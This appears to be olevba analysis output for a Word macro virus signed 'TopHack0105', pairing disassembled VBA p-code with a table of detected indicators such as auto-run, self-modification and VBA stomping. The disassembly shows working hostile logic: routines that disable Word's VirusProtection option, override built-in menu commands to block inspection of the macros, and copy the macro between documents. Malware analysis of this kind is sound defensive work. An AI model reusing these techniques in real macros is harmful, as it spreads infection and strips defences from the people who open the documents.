' 	ArgsCall WordCaption 0x0000 
' Line #224:
' 	Ld WordBasic 
' 	ArgsMemCall NewDefault 0x0000 
' Line #225:
' 	ArgsCall CopyDoc 0x0000 
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
' 	FuncDefn (Sub FileNew())
' Line #229:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #230:
' 	ArgsCall WordCaption 0x0000 
' Line #231:
' 	ArgsCall CopyDoc 0x0000 
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	EndSub 
' Line #234:
' Line #235:
' 	FuncDefn (Sub Scan())
' Line #236:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #240:
' 	EndWith 
' Line #241:
' 	EndSub 
' Line #242:
' Line #243:
' 	FuncDefn (Sub NoScan())
' Line #244:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #245:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #246:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #247:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #248:
' 	EndWith 
' Line #249:
' 	EndSub 
' Line #250:
' Line #251:
' 	FuncDefn (Sub ToolsOptions())
' Line #252:
' 	ArgsCall initial 0x0000 
' Line #253:
' 	ArgsCall NoScan 0x0000 
' Line #254:
' 	OnError (Resume Next) 
' Line #255:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #256:
' 	ArgsCall WordCaption 0x0000 
' Line #257:
' 	ArgsCall Scan 0x0000 
' Line #258:
' 	EndSub 
' Line #259:
' Line #260:
' 	FuncDefn (Sub NoAccess())
' Line #261:
' 	Ld msg 
' 	Ld vbCritical 
' 	Ld mword 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #262:
' 	ArgsCall WordCaption 0x0000 
' Line #263:
' 	EndSub 
' Line #264:
' Line #265:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #266:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #267:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #268:
' 	Ld aaa 
' 	Ld code 
' 	LitDI2 0x0003 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St cruel 
' Line #269:
' 	Ld pass 
' 	Ld mword 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld cruel 
' 	Eq 
' 	IfBlock 
' Line #270:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #271:
' 	LitStr 0x0016 "Congratulations Boss !"
' 	Ld vbExclamation 
' 	LitStr 0x000B "TopHack0105"
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #272:
' 	ElseBlock 
' Line #273:
' 	ArgsCall NoAccess 0x0000 
' Line #274:
' 	EndIfBlock 
' Line #275:
' 	EndFunc 
' Line #276:
' Line #277:
' 	FuncDefn (Sub ToolsMacro())
' Line #278:
' 	LitStr 0x0032 "Create Macro from Visual Basic Editor or Alt + F11"
' 	Ld vbExclamation 
' 	Ld mword 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #279:
' 	EndSub 
' Line #280:
' Line #281:
' 	FuncDefn (Sub FileTemplates())
' Line #282:
' 	ArgsCall initial 0x0000 
' Line #283:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #284:
' Line #285:
' 	ArgsCall WordCaption 0x0000 
' Line #286:
' 	EndSub 
' Line #287:
' Line #288:
' 	FuncDefn (Sub viewvbcode())
' Line #289:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #290:
' 	EndSub 
' Line #291:
' Line #292:
' 	FuncDefn (Sub viewcode())
' Line #293:
' 	ArgsCall viewvbcode 0x0000 
' Line #294:
' 	EndSub 
' Line #295:
' Line #296:
' 	FuncDefn (Sub Organizer())
' Line #297:
' 	ArgsCall initial 0x0000 
' Line #298:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #299:
' 	ArgsCall WordCaption 0x0000 
' Line #300:
' 	EndSub 
' Line #301:
' Line #302:
' 	FuncDefn (Sub FormatStyle())
' Line #303:
' 	ArgsCall initial 0x0000 
' Line #304:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #305:
' 	ArgsMemCallWith Display 0x0000 
' Line #306:
' 	ArgsMemCallWith Execute 0x0000 
' Line #307:
' 	EndWith 
' Line #308:
' 	ArgsCall WordCaption 0x0000 
' Line #309:
' 	EndSub 
' Line #310:
' Line #311:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #312:
' 	OnError (Resume Next) 
' Line #313:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #314:
' 	EndSub 
' Line #315:
' Line #316:
' 	FuncDefn (Sub WordCaption())
' Line #317:
' 	OnError (Resume Next) 
' Line #318:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' 	EndIf 
' Line #319:
' 	Ld Animated 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #320:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	St anIntv 
' Line #321:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #322:
' 	Ld TOP 
' 	St anCap 
' Line #323:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #324:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #325:
' 	EndSub 
' Line #326:
' Line #327:
' 	FuncDefn (Sub words())
' Line #328:
' 	OnError (Resume Next) 
' Line #329:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #330:
' 	LitStr 0x0014 "Have a nice day ...!"
' 	Ld vbExclamation 
' 	Ld mword 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #331:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #332:
' 	LitStr 0x001E "Happy Birthday, Long Life ...!"
' 	Ld vbExclamation 
' 	Ld mword 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	EndIfBlock 
' Line #335:
' 	Return 
' Line #336:
' 	EndSub 
' Line #337:
' Line #338:
' 	FuncDefn (Sub ScrollCaption())
' Line #339:
' 	Ld Animated 
' 	IfBlock 
' Line #340:
' 	Ld anCap 
' 	Ld anPos 
' 	ArgsLd Right$ 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #341:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld anIntv 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #342:
' 	Ld anPos 
' 	LitDI2 0x0001 
' 	Add 
' 	St anPos 
' Line #343:
' 	EndIfBlock 
' Line #344:
' Line #345:
' 	Ld anPos 
' 	Ld anCap 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #346:
' 	OnError (Resume Next) 
' Line #347:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #348:
' Line #349:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #350:
' 	Ld anCap 
' 	Ld TOP 
' 	Eq 
' 	IfBlock 
' Line #351:
' 	Ld Hack0105 
' 	St anCap 
' Line #352:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #353:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #354:
' 	Ld anCap 
' 	Ld Hack0105 
' 	Eq 
' 	ElseIfBlock 
' Line #355:
' 	Ld mw 
' 	St anCap 
' Line #356:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #357:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #358:
' 	Ld anCap 
' 	Ld mw 
' 	Eq 
' 	ElseIfBlock 
' Line #359:
' 	Ld TOP 
' 	St anCap 
' Line #360:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x04B0 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #361:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	EndIfBlock 
' Line #364:
' 	EndSub 
' Line #365:
' Line #366:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

